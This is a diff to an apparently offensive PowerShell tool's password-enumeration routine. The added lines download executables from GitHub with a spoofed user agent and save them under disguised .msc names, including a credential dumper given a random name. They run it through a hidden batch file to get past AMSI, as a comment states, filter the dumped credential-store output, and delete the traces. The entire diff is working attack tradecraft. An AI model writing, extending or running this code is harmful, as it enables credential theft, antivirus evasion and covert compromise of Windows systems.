@@ -7,7 +7,7 @@
    Tested Under: Windows 10 (18363) x64 bits
    Required Dependencies: Invoke-WebRequest|BitsTransfer
    Optional Dependencies: BCDstore.msc|perfmon.msc|DecryptAutoLogon.msc
-   PS cmdlet Dev version: v2.2.7
+   PS cmdlet Dev version: v2.2.8
 
 .DESCRIPTION
    -GetPasswords [ Enum ] search creds in wstore\reg\disk diferent locations.
@@ -84,20 +84,20 @@ If($GetPasswords -ieq "Enum"){
       .NOTES
          Required Dependencies: Invoke-WebRequest
          Required Dependencies: Adminstrator privileges
-         Required Dependencies: BCDstore.msc and perfmon.msc
+         Required Dependencies: BCDstore.msc and diskmgr.msc
       #>
 
       ## Build Trigger bat script on %tmp% { to execute perfmon.msc @args }
       echo "@echo off"|Out-File $Env:TMP\setup.bat -encoding ascii -force
-      echo "perfmon.msc -s > diskmgmt.log"|Add-Content $Env:TMP\setup.bat -encoding ascii
+      echo "diskmgr.msc -s > diskmgmt.log"|Add-Content $Env:TMP\setup.bat -encoding ascii
       echo "exit"|Add-Content $Env:TMP\setup.bat -encoding ascii
 
       ## Download and masquerade the required standalone executables
       If(-not(Test-Path -Path "$Env:TMP\BCDstore.msc" -EA SilentlyContinue)){
          iwr -Uri https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe -OutFile $Env:TMP\BCDstore.msc -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
       }
-      If(-not(Test-Path -Path "$Env:TMP\perfmon.msc" -EA SilentlyContinue)){
-         iwr -Uri https://raw.githubusercontent.com/pentestmonkey/pysecdump/master/pysecdump.exe -OutFile $Env:TMP\perfmon.msc -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
+      If(-not(Test-Path -Path "$Env:TMP\diskmgr.msc" -EA SilentlyContinue)){
+         iwr -Uri https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/Compiled.exe -OutFile $Env:TMP\diskmgr.msc -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
       }
 
       If(-not(Test-Path -Path "$Env:TMP\BCDstore.msc" -EA SilentlyContinue)){
@@ -135,14 +135,20 @@ If($GetPasswords -ieq "Enum"){
    ## Scanning credential store for creds!
    Write-Host "`n`nScanning credential store for creds!" -ForegroundColor Green
    Write-Host "------------------------------------"
-   If(-not(Test-Path -Path "$Env:TMP\perfmon.msc" -EA SilentlyContinue)){
-      iwr -Uri https://raw.githubusercontent.com/pentestmonkey/pysecdump/master/pysecdump.exe -OutFile $Env:TMP\perfmon.msc -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
-   }
+   $RandomMe = -join ((65..90) + (97..122) | Get-Random -Count 7 | % {[char]$_})
+   iwr -Uri https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/Compiled.exe -OutFile $Env:TMP\$RandomMe.msc -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
 
    ## Build Output Table
-   If(Test-Path -Path "$Env:TMP\perfmon.msc" -EA SilentlyContinue){
+   If(Test-Path -Path "$Env:TMP\$RandomMe.msc" -EA SilentlyContinue){
 
-      cd $Env:TMP;.\perfmon.msc -C > $Env:TMP\Wdlogfile.log
+      ## Build Trigger bat script on %tmp% { to execute perfmon.msc @args }
+      # cd $Env:TMP;.\perfmon.msc -C > $Env:TMP\Wdlogfile.log <- flaged by amsi
+      echo "@echo off"|Out-File $Env:TMP\setup.bat -encoding ascii -force
+      echo "$RandomMe.msc -C > Wdlogfile.log"|Add-Content $Env:TMP\setup.bat -encoding ascii
+      echo "exit"|Add-Content $Env:TMP\setup.bat -encoding ascii
+      Start-Sleep -Seconds 1;cd $Env:TMP
+      Start-Process -WindowStyle Hidden -FilePath setup.bat -Wait
+
       Get-Content -Path "$Env:TMP\Wdlogfile.log" | Where-Object {
          $_ -NotMatch '{' -and $_ -NotMatch '\[' -and $_ -NotMatch 'Flags:' -and $_ -NotMatch 'Persist:' -and $_ -NotMatch 'Attributes:' -and $_ -NotMatch 'Type:'
       }| Select-Object -Skip 4 | Select-Object -SkipLast 2
@@ -150,7 +156,7 @@ If($GetPasswords -ieq "Enum"){
 
    }Else{
         
-      Write-Host "[error] fail to download: $Env:TMP\perfmon.msc!" -ForegroundColor Red -BackgroundColor Black
+      Write-Host "[error] fail to download: $Env:TMP\$RandomMe.msc!" -ForegroundColor Red -BackgroundColor Black
         
    }
 
@@ -253,9 +259,10 @@ If($GetPasswords -ieq "Enum"){
         ## Delete ALL artifacts left behind by Enum @argument
         If(Test-Path -Path "$Env:TMP\setup.bat"){Remove-Item -Path "$Env:TMP\setup.bat" -Force}
         If(Test-Path -Path "$Env:TMP\passwd.txt"){Remove-Item -Path "$Env:TMP\passwd.txt" -Force}
-        If(Test-Path -Path "$Env:TMP\perfmon.msc"){Remove-Item -Path "$Env:TMP\perfmon.msc" -Force}
+        If(Test-Path -Path "$Env:TMP\diskmgr.msc"){Remove-Item -Path "$Env:TMP\diskmgr.msc" -Force}
         If(Test-Path -Path "$Env:TMP\diskmgmt.log"){Remove-Item -Path "$Env:TMP\diskmgmt.log" -Force}
         If(Test-Path -Path "$Env:TMP\BCDstore.msc"){Remove-Item -Path "$Env:TMP\BCDstore.msc" -Force}
+        If(Test-Path -Path "$Env:TMP\$RandomMe.msc"){Remove-Item -Path "$Env:TMP\$RandomMe.msc" -Force}
         If(Test-Path -Path "$Env:TMP\Wdlogfile.log"){Remove-Item -Path "$Env:TMP\Wdlogfile.log" -Force}
         If(Test-Path -Path "$Env:TMP\DecryptAutoLogon.msc"){Remove-Item -Path "$Env:TMP\DecryptAutoLogon.msc" -Force}
      }
